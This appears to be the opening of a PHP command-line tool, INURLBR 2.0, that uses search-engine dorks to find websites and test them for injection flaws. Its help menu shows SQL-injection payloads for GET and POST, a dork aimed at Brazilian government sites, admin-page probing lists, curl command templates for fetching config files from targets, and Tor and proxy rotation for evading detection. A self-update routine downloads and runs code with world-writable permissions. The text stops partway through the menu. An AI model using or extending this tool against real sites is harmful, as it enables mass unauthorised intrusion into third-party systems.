#!/usr/bin/php -q
<?php
/*

  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal.
  It is the end user's responsibility to obey all applicable local, state and federal laws.
  Developers assume no liability and are not responsible for any misuse or damage caused by this program

  [+] AUTOR:        Cleiton Pinheiro / Nick: googleINURL
  [+] Blog:         http://blog.inurl.com.br
  [+] Twitter:      https://twitter.com/googleinurl
  [+] Fanpage:      https://fb.com/InurlBrasil
  [+] Pastebin      http://pastebin.com/u/Googleinurl
  [+] GIT:          https://github.com/googleinurl
  [+] PSS:          http://packetstormsecurity.com/user/googleinurl
  [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
  [+] PLUS:         http://google.com/+INURLBrasil

  [+] SCRIPT NAME: INURLBR 2.0

  [+] Dependencies:
  sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl


  [+] Play LIST TUTORIAL:
  https://www.youtube.com/watch?v=jwjZUsgf9xM&list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR

 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
(!isset($_SESSION) ? session_start() : NULL);
__OS();

//Capturing TERMINAL VALUES.
$commandos_list = array(
    'dork:', 'dork-file:', 'tor-random::', 'no-banner::', 'exploit-cad:',
    'exploit-all-id:', 'exploit-vull-id:', 'exploit-list::', 'exploit-get:', 'exploit-post:',
    'exploit-command:', 'command-all:', 'command-vul:', 'replace:', 'regexp:', 'regexp-filter:',
    'sall:', 'sub-file:', 'sub-post::', 'sub-get::', 'user-agent:', 'url-reference:', 'unique::', 'delay:',
    'time-out:', 'http-header:', 'ifcode:', 'ifurl:', 'cms-check::', 'gc::', 'mp:', 'target:',
    'proxy:', 'proxy-file:', 'time-proxy:', 'proxy-http-file', 'update::', 'info::', 'help::', 'ajuda::',
    'install-dependence::', 'sendmail:', 'alexa-rank::', 'beep::'
);

$opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);

//VERIFYING LIB php5-curl IS INSTALLED.
(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );
(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);



//Resetting VALUES $ _SESSION ['config']
$_SESSION['config'] = array();
$_SESSION['config']['version_script'] = '2.0';
$_SESSION['config']['totas_urls'] = NULL;
$_SESSION['config']["contUrl"] = 0;
$_SESSION['config']['cont_email'] = 0;
$_SESSION['config']['cont_url'] = 0;
$_SESSION['config']['cont_valores'] = 0;
$_SESSION['config']['file_exploit_conf'] = 'exploits.conf';
$_SESSION['config']['out_put_paste'] = 'output/';

$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,";
$_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,.hostname.,";
$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,document.,";
$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com";

$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";

//PRINTING HELP / INFO
(isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? __menu() : NULL);
(isset($opcoes['info']) ? __info() : NULL);

//PRINTING EXPLOITS LIST.
(isset($opcoes['exploit-list']) ? print(__bannerLogo()) . __configExploitsList(1)  : NULL);

//CREATING DEFAULT SETTINGS EXIT RESULTS.
(!is_dir($_SESSION['config']['out_put_paste']) ? mkdir($_SESSION['config']['out_put_paste'], 0777, TRUE) : NULL);

//CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
(!file_exists($_SESSION['config']['file_exploit_conf']) ? touch($_SESSION['config']['file_exploit_conf']) : NULL);

//Deletes FILE cookie STANDARD.
(file_exists('cookie.txt') ? unlink('cookie.txt') : NULL);

//REGISTRATION NEW COMMAND EXPLOIT
(not_isnull_empty($opcoes['exploit-cad']) ? __configExploitsADD($opcoes['exploit-cad']) : NULL);

//Dependencies installation
(isset($opcoes['install-dependence']) ? __installDepencia() : NULL);

//UPDATE SCRIPT
(isset($opcoes['update']) ? __update() : NULL);

################################################################################
#CAPTURE OPTIONS################################################################

if (not_isnull_empty($opcoes['o'])) {

    $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
} else if (!not_isnull_empty($opcoes['o'])) {

    $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
    $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
}

$_SESSION['config']['target'] = not_isnull_empty($opcoes['target']) && !isset($_SESSION['config']['dork']) ? $opcoes['target'] : NULL;
$_SESSION['config']['extrai-url'] = isset($opcoes['u']) && empty($opcoes['o']) ? TRUE : NULL;
$_SESSION['config']['extrai-email'] = isset($opcoes['m']) && empty($opcoes['o']) ? TRUE : NULL;
$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) && __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;
$_SESSION['config']['arquivo_output'] = not_isnull_empty($opcoes['s']) || !empty($opcoes['sall']) ? $opcoes['s'] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s filevull.txt{$_SESSION["c0"]}\n");
$_SESSION['config']['arquivo_output_all'] = not_isnull_empty($opcoes['sall']) ? $opcoes['sall'] : NULL;
$_SESSION['config']['tipoerro'] = not_isnull_empty($opcoes['t']) && __validateOptions('1,2,3,4,5', $opcoes['t']) ? $opcoes['t'] : 1;
$_SESSION['config']['replace'] = not_isnull_empty($opcoes['replace']) ? $opcoes['replace'] : NULL;
$_SESSION['config']['proxy'] = not_isnull_empty($opcoes['proxy']) ? $opcoes['proxy'] : NULL;
$_SESSION['config']['proxy-file'] = not_isnull_empty($opcoes['proxy-file']) ? $opcoes['proxy-file'] : NULL;
$_SESSION['config']['proxy-http'] = not_isnull_empty($opcoes['proxy-http']) ? $opcoes['proxy-http'] : NULL;
$_SESSION['config']['proxy-http-file'] = not_isnull_empty($opcoes['proxy-http-file']) ? $opcoes['proxy-http-file'] : NULL;
$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? $opcoes['exploit-get'] : NULL;
$_SESSION['config']['exploit-post'] = not_isnull_empty($opcoes['exploit-post']) ? __convertUrlQuery($opcoes['exploit-post']) : NULL;
$_SESSION['config']['exploit-command'] = not_isnull_empty($opcoes['exploit-command']) ? $opcoes['exploit-command'] : NULL;
$_SESSION['config']['exploit-vull-id'] = not_isnull_empty($opcoes['exploit-vull-id']) ? $opcoes['exploit-vull-id'] : NULL;
$_SESSION['config']['exploit-all-id'] = not_isnull_empty($opcoes['exploit-all-id']) ? $opcoes['exploit-all-id'] : NULL;
$_SESSION['config']['command-vul'] = not_isnull_empty($opcoes['command-vul']) ? $opcoes['command-vul'] : NULL;
$_SESSION['config']['command-all'] = not_isnull_empty($opcoes['command-all']) ? $opcoes['command-all'] : NULL;
$_SESSION['config']['achar'] = not_isnull_empty($opcoes['a']) ? $opcoes['a'] : NULL;
$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5', $opcoes['d']) ? $opcoes['d'] : NULL;
$_SESSION['config']['verifica_info'] = (__validateOptions($opcoes['d'], 6)) ? 1 : NULL;
$_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;
$_SESSION['config']['cms-check'] = isset($opcoes['cms-check']) ? TRUE : NULL;
$_SESSION['config']['webcache'] = isset($opcoes['gc']) ? TRUE : NULL;
$_SESSION['config']['regexp'] = not_isnull_empty($opcoes['regexp']) ? $opcoes['regexp'] : NULL;
$_SESSION['config']['regexp-filter'] = not_isnull_empty($opcoes['regexp-filter']) ? $opcoes['regexp-filter'] : NULL;
$_SESSION['config']['no-banner'] = isset($opcoes['no-banner']) ? TRUE : NULL;
$_SESSION['config']['user-agent'] = not_isnull_empty($opcoes['user-agent']) ? $opcoes['user-agent'] : NULL;
$_SESSION['config']['url-reference'] = not_isnull_empty($opcoes['url-reference']) ? $opcoes['url-reference'] : NULL;
$_SESSION['config']['max_pag'] = not_isnull_empty($opcoes['mp']) ? $opcoes['mp'] : NULL;
$_SESSION['config']['delay'] = not_isnull_empty($opcoes['delay']) ? $opcoes['delay'] : NULL;
$_SESSION['config']['time-out'] = not_isnull_empty($opcoes['time-out']) ? $opcoes['time-out'] : NULL;
$_SESSION['config']['ifcode'] = not_isnull_empty($opcoes['ifcode']) ? $opcoes['ifcode'] : NULL;
$_SESSION['config']['ifurl'] = not_isnull_empty($opcoes['ifurl']) ? $opcoes['ifurl'] : NULL;
$_SESSION['config']['http-header'] = not_isnull_empty($opcoes['http-header']) ? $opcoes['http-header'] : NULL;
$_SESSION['config']['sub-file'] = not_isnull_empty($opcoes['sub-file']) ? __openFile($opcoes['sub-file'], 1) : NULL;
$_SESSION['config']['sub-post'] = isset($opcoes['sub-post']) ? TRUE : NULL;
$_SESSION['config']['sub-get'] = isset($opcoes['sub-get']) ? TRUE : NULL;
$_SESSION['config']['sendmail'] = not_isnull_empty($opcoes['sendmail']) ? $opcoes['sendmail'] : NULL;
$_SESSION['config']['alexa-rank'] = isset($opcoes['alexa-rank']) ? TRUE : NULL;
$_SESSION['config']['beep'] = isset($opcoes['beep']) ? TRUE : NULL;
$_SESSION['config']['unique'] = isset($opcoes['unique']) ? TRUE : NULL;

################################################################################
#UPDATE SCRIPT##################################################################

function __update() {

    echo __bannerLogo();

    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}WANT TO MAKE UPDATE SCRIPT\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}This can modify the current script\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}ARE YOU SURE ? (y \ n): {$_SESSION["c0"]}";

    if (trim(fgets(STDIN)) == 'y') {

        $resultado = __request_info($curlObject_id = curl_init(), "https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);

        if (not_isnull_empty($resultado['corpo'])) {

            unlink('inurlbr.php');
            $varf = fopen('inurlbr.php', 'a');
            fwrite($varf, $resultado['corpo']);
            fclose($varf);
            chmod('inurlbr.php', 0777);
            echo "\nUPDATE DONE WITH SUCCESS!\n";
            sleep(3);
            system("chmod +x inurlbr.php | php inurlbr.php");
            exit();
        } else {

            echo system("command clear") . __bannerLogo();
            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FAILURE TO SERVER!\n{$_SESSION["c0"]}";
        }
    }
}

################################################################################
#SECURITIES VALIDATION DOUBLE#####################################################

function not_isnull_empty($valor = NULL) {

    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

################################################################################
#MENU###########################################################################

function __menu() {

    return system("command clear") . __getOut(__extra() . "        
 {$_SESSION["c1"]}_    _ ______ _      _____  
| |  | |  ____| |    |  __ \
| |__| | |__  | |    | |__) |
|  __  |  __| | |    |  ___/
| |  | | |____| |____| |    
|_|  |_|______|______|_|

{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
" . $_SESSION['config']['line'] . "
    
{$_SESSION["c1"]}-h{$_SESSION["c0"]}
{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
     [options]:
     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
     {$_SESSION["c1"]}5{$_SESSION["c0"]}   - {$_SESSION["c2"]}HAO123 BR
     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
     {$_SESSION["c1"]}14{$_SESSION["c0"]}  - {$_SESSION["c2"]}BAIDU BR
     {$_SESSION["c1"]}15{$_SESSION["c0"]}  - {$_SESSION["c2"]}YANDEX
     {$_SESSION["c1"]}16{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZOO
     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBOT
     {$_SESSION["c1"]}18{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZHONGSOU
     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
     {$_SESSION["c1"]}23{$_SESSION["c0"]}  - {$_SESSION["c2"]}BOOROW
     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
     ----------------------------------------
     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
   
 {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}

 {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}

 {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
         

 {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
 
 {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
     [options]:
     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$_SESSION["c11"]}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
     - Using multiples dorks:
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?´0x27;'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
     
 {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
             
 {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
     
 {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
 
 {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
       
 {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
 
 {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
 
 {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.

 {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
     
 {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.

 {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
     
 {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
     
 {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
